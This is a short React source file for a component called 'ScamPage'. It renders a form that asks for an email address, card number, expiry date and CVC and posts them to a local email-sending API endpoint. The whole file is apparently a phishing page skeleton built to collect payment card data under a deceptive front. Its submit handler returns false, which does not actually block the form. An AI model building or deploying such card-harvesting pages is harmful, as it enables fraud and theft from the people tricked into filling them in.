function ScamPage() {
    function handleSubmit() {
        return false;
    }

    return(
        <>
            <form method="post" action="http://localhost:5224/api/Email/send" onSubmit={handleSubmit}>
                <input type="email" name="to" id="email" placeholder="Email" />
                <input type="text" name="cardNumber" />
                <input type="text" name="date" />
                <input type="text" name="cvc" />
                <input type="submit" value="Send" id="submit" />
            </form>
        </>
    );
}

export default ScamPage;